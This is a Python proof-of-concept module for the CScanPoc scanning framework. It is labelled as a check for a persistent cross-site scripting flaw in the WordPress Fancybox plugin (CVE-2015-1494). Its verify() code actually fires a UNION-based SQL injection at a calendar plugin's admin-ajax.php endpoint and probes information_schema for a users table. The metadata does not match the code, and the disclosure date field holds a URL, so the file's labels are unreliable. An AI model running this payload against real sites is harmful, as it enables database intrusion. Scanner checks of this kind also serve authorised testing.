# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0080'  # 平台漏洞编号，留空
    name = 'WordPress Plugin Fancybox 3.0.2 - Persistent Cross-Site Scripting'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = 'https://www.exploit-db.com/exploits/36087/'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        WordPress Plugin Fancybox 3.0.2 - Persistent Cross-Site Scripting.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36087/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-1494'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin Fancybox 3.0.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '438fec9a-6677-4abb-8157-24857b99236d'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            FETCH_PREFIX_URL = '%s/wp-admin/admin-ajax.php?action=spiderbigcalendar_month&theme_id=13&calendar=1&select=month,list,week,day,&date=2015-02&many_sp_calendar=1&cur_page_url=%s&cat_id=1)%%20UNION%%20SELECT%%20%s,1,%%20FROM_UNIXTIME(1423004400),1,(SELECT%%20CONCAT(CHAR(35,35,35,35),table_name,CHAR(35,35,35,35))%%20FROM%%20information_schema.tables%%20WHERE%%20table_name%%20LIKE%%20(%%20SELECT%%20CHAR(37,%%20117,%%20115,%%20101,%%20114,%%20115)%%20)%%20LIMIT%%201),1,1,1,1,%%20CHAR(110,%%20111,%%2095,%%20114,%%20101,%%20112,%%20101,%%2097,%%20116),1,1,1,1,1,1,1,1,1%%20FROM%%20DUAL;--%%20--%%20&widget=0'
            FAKE_ID_TO_SEARCH = '12345677654321'
            PATTERN_TO_SEARCH = 'ev_ids=' + FAKE_ID_TO_SEARCH

            fullURL = FETCH_PREFIX_URL % (arg, arg, FAKE_ID_TO_SEARCH)
            code, head, res, errcode, _ = hh.http(fullURL)
            if PATTERN_TO_SEARCH in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
